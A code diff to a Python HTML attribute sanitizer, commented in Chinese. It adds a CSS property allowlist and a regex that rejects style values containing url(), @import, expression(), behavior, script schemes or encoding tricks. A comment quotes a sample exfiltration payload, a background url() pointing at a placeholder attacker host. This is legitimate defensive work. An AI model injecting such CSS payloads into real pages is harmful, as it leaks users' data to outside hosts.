@@ -263,6 +263,48 @@ _ATTR_VALUE_RE = re.compile(
     re.VERBOSE,
 )
 
+# style 属性的 CSS 声明白名单。放行任意 CSS 等于允许数据外带：
+#   background: url(https://attacker/?c=...) 会在订阅端/预览端静默发起外连，
+#   旧版 IE 的 expression()/behavior 还能直接执行脚本。
+# 前端 MARKDOWN_SANITIZE_CONFIG 已经整体禁掉 style 属性（lib/sanitize.ts），
+# 这里与它收敛口径：只保留纯排版声明，凡含 URL/导入/表达式/编码痕迹的值一律丢弃。
+_CSS_DECL_RE = re.compile(r"([a-z-]+)\s*:\s*([^;]*)", re.IGNORECASE)
+_CSS_DANGEROUS_RE = re.compile(
+    r"url\s*\(|@import|expression\s*\(|behavior\s*:|-moz-binding|"
+    r"javascript\s*:|vbscript\s*:|data\s*:|<\s*/?|\\|&#|%[0-9a-f]{2}",
+    re.IGNORECASE,
+)
+_CSS_ALLOWED_PROPS = frozenset(
+    {
+        "color", "background", "background-color", "font", "font-size",
+        "font-weight", "font-style", "font-family", "text-align",
+        "text-decoration", "text-indent", "text-shadow", "line-height",
+        "letter-spacing", "word-spacing", "white-space", "vertical-align",
+        "margin", "margin-top", "margin-right", "margin-bottom", "margin-left",
+        "padding", "padding-top", "padding-right", "padding-bottom", "padding-left",
+        "width", "height", "max-width", "max-height", "min-width", "min-height",
+        "border", "border-radius", "border-color", "border-width", "border-style",
+        "border-top", "border-right", "border-bottom", "border-left",
+        "display", "float", "clear", "overflow", "box-sizing", "box-shadow",
+        "opacity", "list-style", "list-style-type", "gap", "align-items",
+        "justify-content", "flex", "flex-direction", "grid-template-columns",
+    }
+)
+
+
+def _sanitize_style_value(value: str) -> str | None:
+    """把 style 值收敛成「纯排版声明」；没有任何合法声明时返回 None（丢弃属性）。"""
+    kept: list[str] = []
+    for match in _CSS_DECL_RE.finditer(value):
+        prop = match.group(1).lower()
+        val = match.group(2).strip()
+        if prop not in _CSS_ALLOWED_PROPS or not val:
+            continue
+        if _CSS_DANGEROUS_RE.search(val):
+            continue
+        kept.append(f"{prop}: {val}")
+    return "; ".join(kept) if kept else None
+
 
 def _rewrite_attrs(tag: str, attr_string: str) -> str:
     """对属性串做 allowlist 过滤 + javascript/vbscript 伪协议剥离 + onxxx 删除。"""
@@ -321,6 +363,12 @@ def _rewrite_attrs(tag: str, attr_string: str) -> str:
             lv_no_ws = re.sub(r"\s+", "", lv)
             if lv_no_ws.startswith(("javascript:", "vbscript:", "data:text/html")):
                 continue
+        # style：只留纯排版声明，挡住 url() 外带 / expression() 执行 / 编码绕过
+        if has_eq and v and key == "style":
+            cleaned_style = _sanitize_style_value(v)
+            if cleaned_style is None:
+                continue
+            v = cleaned_style
         if not has_eq or v is None:
             out.append(key)
         else:
